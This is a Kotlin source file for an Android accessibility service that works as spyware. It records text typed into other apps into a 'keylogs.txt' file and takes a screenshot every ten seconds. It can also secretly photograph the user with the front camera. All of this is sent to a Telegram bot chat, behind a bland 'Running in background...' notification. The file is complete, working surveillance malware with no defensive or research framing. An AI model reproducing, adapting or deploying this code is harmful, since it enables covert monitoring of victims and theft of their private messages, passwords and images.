package com.example.telegramsender

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.util.Log
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.content.Context
import android.content.BroadcastReceiver
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import kotlinx.coroutines.*
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Request
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.concurrent.Executor

class TelegramService : AccessibilityService(), LifecycleOwner {

    private val client = OkHttpClient()
    private var job: Job? = null
    
    // Default credentials, will be loaded from Prefs
    private var botToken: String = ""
    private var targetChatId: String = ""
    private var sendCamera: Boolean = false
    
    private val lifecycleRegistry = LifecycleRegistry(this)
    private var imageCapture: ImageCapture? = null
    
    private val lastTextMap = mutableMapOf<String, String>()
    private val forceSendReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.example.telegramsender.ACTION_FORCE_SEND") {
                Log.d("TelegramService", "Force send logs requested")
                CoroutineScope(Dispatchers.IO).launch {
                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                        sendAndClearLogs()
                    }
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundServiceNotification()
        lifecycleRegistry.currentState = Lifecycle.State.CREATED
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundServiceNotification()
        return START_STICKY
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("TelegramService", "Accessibility Service Connected")
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        
        startForegroundServiceNotification()
        
        loadCredentials()
        
        // Register receiver
        val filter = android.content.IntentFilter("com.example.telegramsender.ACTION_FORCE_SEND")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(forceSendReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(forceSendReceiver, filter)
        }
        
        if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
            startCaptureLoop()
            sendTelegramMessage(botToken, targetChatId, "Service Connected (Accessibility Mode)")
        } else {
            Log.e("TelegramService", "Credentials missing on connect")
        }
    }





    private fun loadCredentials() {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        botToken = pref.getString("token", "") ?: ""
        targetChatId = pref.getString("chatId", "") ?: ""
        sendCamera = pref.getBoolean("sendCamera", false)
    }

    private var lastLogSendTime = System.currentTimeMillis()

    private fun startCaptureLoop() {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                // Refresh credentials in case they changed
                loadCredentials()
                
                if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                    captureAndSend()
                    if (sendCamera) {
                        captureCameraAndSend()
                    }
                    
                    // Check logs periodicity (every 1 hour)
                    if (System.currentTimeMillis() - lastLogSendTime > 1 * 60 * 60 * 1000) {
                        sendAndClearLogs()
                    }
                }
                delay(10_000) // 10 seconds delay
            }
        }
    }
    
    private suspend fun captureCameraAndSend() {
        withContext(Dispatchers.Main) {
            try {
                val cameraProviderFuture = ProcessCameraProvider.getInstance(this@TelegramService)
                cameraProviderFuture.addListener({
                    val cameraProvider = cameraProviderFuture.get()
                    
                    val imageCapture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()

                    val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA // Or BACK based on logic

                    try {
                        cameraProvider.unbindAll()
                        cameraProvider.bindToLifecycle(
                            this@TelegramService,
                            cameraSelector,
                            imageCapture
                        )
                        
                        imageCapture.takePicture(
                            ContextCompat.getMainExecutor(this@TelegramService),
                            object : ImageCapture.OnImageCapturedCallback() {
                                override fun onCaptureSuccess(image: ImageProxy) {
                                    val bitmap = imageProxyToBitmap(image)
                                    image.close()
                                    if (bitmap != null) {
                                        CoroutineScope(Dispatchers.IO).launch {
                                            sendTelegramPhoto(botToken, targetChatId, bitmap, "camera.jpg")
                                        }
                                    }
                                    // Cleanup
                                    cameraProvider.unbindAll()
                                }

                                override fun onError(exception: ImageCaptureException) {
                                    Log.e("TelegramService", "Camera capture failed", exception)
                                    cameraProvider.unbindAll()
                                }
                            }
                        )
                    } catch (exc: Exception) {
                        Log.e("TelegramService", "Use case binding failed", exc)
                    }
                }, ContextCompat.getMainExecutor(this@TelegramService))
            } catch (e: Exception) {
                Log.e("TelegramService", "Camera Setup Failed", e)
            }
        }
    }
    
    private fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
    }
    private fun checkLogSizeAndSend() {
        val file = java.io.File(filesDir, "keylogs.txt")
        if (file.exists() && file.length() > 1 * 1024 * 1024) { // 1MB
            CoroutineScope(Dispatchers.IO).launch {
                if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                    sendAndClearLogs()
                }
            }
        }
    }

    private fun sendAndClearLogs() {
        val file = java.io.File(filesDir, "keylogs.txt")
        if (!file.exists() || file.length() == 0L) return

        try {
            val logContent = file.readBytes()
            
            val url = "https://api.telegram.org/bot$botToken/sendDocument"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", targetChatId)
                .addFormDataPart("document", "keylogs_${System.currentTimeMillis()}.txt",
                    logContent.toRequestBody("text/plain".toMediaTypeOrNull(), 0, logContent.size))
                .build()
                
            val request = Request.Builder().url(url).post(requestBody).build()
            
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d("TelegramService", "Logs sent successfully")
                    // Clear file only on success
                    file.writeText("")
                    lastLogSendTime = System.currentTimeMillis()
                } else {
                    Log.e("TelegramService", "Failed to send logs: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e("TelegramService", "Error sending logs", e)
        }
    }

    private fun captureAndSend() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val bitmap = try {
                            Bitmap.wrapHardwareBuffer(
                                screenshotResult.hardwareBuffer,
                                screenshotResult.colorSpace
                            )
                        } catch (e: Exception) {
                            Log.e("TelegramService", "Bitmap conversion failed", e)
                            null
                        }

                        screenshotResult.hardwareBuffer.close()

                        if (bitmap != null) {
                            // Copy to software bitmap to process/compress
                            val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                            bitmap.recycle() // Recycle hardware wrapper
                            
                            if (softwareBitmap != null) {
                                CoroutineScope(Dispatchers.IO).launch {
                                    sendTelegramPhoto(botToken, targetChatId, softwareBitmap, "screenshot.jpg")
                                }
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e("TelegramService", "Screenshot failed: $errorCode")
                    }
                }
            )
        } else {
            Log.e("TelegramService", "Accessibility screenshots require Android 11+")
        }
    }
    
    private fun sendTelegramMessage(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try {
            client.newCall(request).execute().use { }
        } catch (_: Exception) {}
    }

    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
        val url = "https://api.telegram.org/bot$token/sendPhoto"
        
        // Resize if too big to avoid socket timeouts
        val scale = if (originalBitmap.width > 720) 720f / originalBitmap.width else 1.0f
        val matrix = android.graphics.Matrix()
        matrix.postScale(scale, scale)
        val resizedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
        
        val stream = ByteArrayOutputStream()
        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
        val byteArray = stream.toByteArray()
        
        // Clean up
        if (originalBitmap != resizedBitmap) {
             originalBitmap.recycle()
        }
        resizedBitmap.recycle()
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", filename,
                byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
            .build()
            
        val request = Request.Builder().url(url).post(requestBody).build()
        
        try {
            client.newCall(request).execute().use { response -> 
                if (!response.isSuccessful) {
                    Log.e("TelegramService", "Failed to send photo: ${response.code}")
                } else {
                    Log.d("TelegramService", "Photo sent successfully (${byteArray.size} bytes)")
                }
            }
        } catch (e: IOException) {
            Log.e("TelegramService", "Network error", e)
        }
    }



    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "TelegramSenderChannel"
            val channelName = "Background Service"
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, "TelegramSenderChannel")
            .setContentTitle("Telegram Sender")
            .setContentText("Running in background...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()

        // Service ID 1
        startForeground(1, notification)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Filter out system UI noise
        if (event.packageName?.toString() == "com.android.systemui") return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val currentText = event.text?.filterNot { it.isNullOrBlank() }?.joinToString(" ") ?: ""
            val key = "${event.packageName}_${event.source?.viewIdResourceName ?: "unknown"}"
            val previousText = lastTextMap[key] ?: ""
            
            // "Log on Clear" Logic:
            // If the text field becomes empty (or very short) after having substantial text, 
            // we assume the message was SENT or cleared.
            // valid message > 2 chars, cleared means < 1 char
            
            if (currentText.isEmpty() && previousText.trim().length > 1) {
                // Log the COMPLETED message
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
                val logEntry = "[$timestamp] [${event.packageName}]: $previousText\n"
                appendLogToFile(logEntry)
            }
            
            // Always update the map with current state
            lastTextMap[key] = currentText
        }
    }
    
    private fun appendLogToFile(logEntry: String) {
        try {
            val file = java.io.File(filesDir, "keylogs.txt")
            // Limit file size (managed by checkLogSizeAndSend, but failsafe here)
            java.io.FileWriter(file, true).use { writer ->
                writer.append(logEntry)
            }
            checkLogSizeAndSend()
        } catch (e: Exception) {
            Log.e("TelegramService", "Failed to write log", e)
        }
    }

    override fun onInterrupt() {
        Log.w("TelegramService", "Service Interrupted")
        job?.cancel()
    }
    
    override fun onUnbind(intent: Intent?): Boolean {
        job?.cancel()
        try {
            unregisterReceiver(forceSendReceiver)
        } catch (e: Exception) {
            Log.e("TelegramService", "Receiver not registered", e)
        }
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        return super.onUnbind(intent)
    }

    override val lifecycle: Lifecycle
        get() = lifecycleRegistry
}
